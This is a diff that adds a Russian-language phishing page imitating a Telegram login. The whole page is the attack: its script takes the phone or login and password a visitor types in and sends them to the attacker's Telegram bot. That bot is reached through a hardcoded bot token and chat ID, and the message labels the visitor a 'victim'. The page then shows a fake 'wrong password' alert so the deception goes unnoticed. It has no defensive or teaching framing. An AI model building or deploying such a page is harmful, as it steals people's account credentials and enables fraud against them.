@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Telegram Login</title>
+</head>
+<body>
+    <h2>Введите данные для входа в Telegram</h2>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Телефон или логин" required><br>
+        <input type="password" id="password" placeholder="Пароль" required><br>
+        <button type="submit">Войти</button>
+    </form>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            let username = document.getElementById('username').value;
+            let password = document.getElementById('password').value;
+            
+            // Отправляем на твоего бота (через Telegram API)
+            let botToken = "8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20";  // Тот же токен
+            let chatId = "8641773493";  // Твой Telegram ID
+            let message = `Жертва: ${username}\nПароль: ${password}`;
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            // Отправляем POST-запрос (без перезагрузки страницы)
+            fetch(url, { method: 'POST' })
+                .then(response => {
+                    alert("Неверный логин или пароль. Попробуйте снова.");  // Разводим жертву
+                })
+                .catch(error => {
+                    alert("Ошибка сервера. Повторите позже.");
+                });
+        });
+    </script>
+</body>
+</html>
